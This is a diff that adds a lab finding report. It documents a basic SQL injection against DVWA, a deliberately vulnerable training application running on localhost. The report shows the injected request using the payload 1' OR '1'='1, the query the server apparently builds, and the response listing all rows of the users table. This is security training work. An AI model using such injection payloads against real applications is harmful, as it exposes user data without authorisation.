@@ -1,0 +1,59 @@
+========================================================
+FINDING F-01 — SQL Injection (DVWA)
+Target: DVWA | Module: SQL Injection | Security Level: Low
+========================================================
+
+--- REQUEST ---
+
+GET http://localhost:8080/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
+Host: localhost:8080
+Cookie: PHPSESSID=<your-session-id>; security=low
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+(Plain form equivalent — what you typed into the DVWA input box)
+Input Field Value: 1' OR '1'='1
+
+--- RAW QUERY CONSTRUCTED BY THE SERVER (inferred) ---
+
+SELECT first_name, last_name
+FROM users
+WHERE user_id = '1' OR '1'='1';
+
+--- RESPONSE (what DVWA returned) ---
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+
+ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+
+ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+
+ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+
+ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+
+--- OBSERVATION ---
+
+The application returned ALL rows from the users table instead of
+a single row. This confirms the SQL Injection is live — user input
+is being interpolated directly into the SQL query with no
+sanitisation or parameterisation.
+
+========================================================
+Tool used: Browser (Firefox) — DVWA built-in input form
+Date: [fill in your actual test date]
+Tester: Indrajit Singh
+========================================================
